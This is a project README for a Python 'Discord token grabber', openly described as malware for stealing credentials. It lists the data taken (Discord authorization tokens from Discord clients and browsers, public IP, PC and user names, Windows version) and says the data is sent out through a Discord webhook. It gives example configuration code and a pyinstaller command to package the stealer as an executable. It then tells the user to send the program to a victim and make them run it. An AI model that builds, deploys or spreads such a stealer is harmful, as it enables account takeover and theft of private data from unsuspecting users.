<h1 align="center">Discord Token Grabber</h1>
<p align="center">A Discord token grabber written in Python 3. </p>

![visitor badge](https://visitor-badge.glitch.me/badge?page_id=mega145.Discord_token_grabber&left_color=red&right_color=green)

This version of the grabber **only** supports **Windows**.
# Features
 - Transfers via Discord webhook
 - Sends: Public IP, PCName, PCUserName, Windows Version, Discord username, descriminator , token
 - Searches for authorization tokens in multiple directories (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
 - Only requests library needed
 - Can be used as a library

# Example Message
![example](https://imgur.com/HfGR31U.png "example of simple mode")


# How to use
 1. Create a webhook on your Discord server.
<br>
 2. add it to another script (preferably as a library)

example:
```python
import token_stealer
token_stealer.WEBHOOK_URL = "https://discord.com/api/webhooks/123456789/fyugYDStygft2g7y8f6datyFTYydfg61hfTY78y"
token_stealer.PING_ME = True
token_stealer.SEND_IP = True
token_stealer.SEND_PC_INFO = True
token_stealer.fancy()
```
2.75. Compile the script using pyinstaller (optional but recomended)
```
pyinstaller --onefile --console --name "program_name_here" --no-embed-manifest --add-data "C:/path/to/project/token_stealer.py;."  "C:/path/to/project/your_script.py"
```
3. Send the script to your victim and make them run it.

# Changelog:
```
- a whole lot of code refactoring
- added simple , fancy , raw functions
```

[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=mega145&repo=Discord_token_grabber&bg_color=151515)](https://github.com/anuraghazra/github-readme-stats)
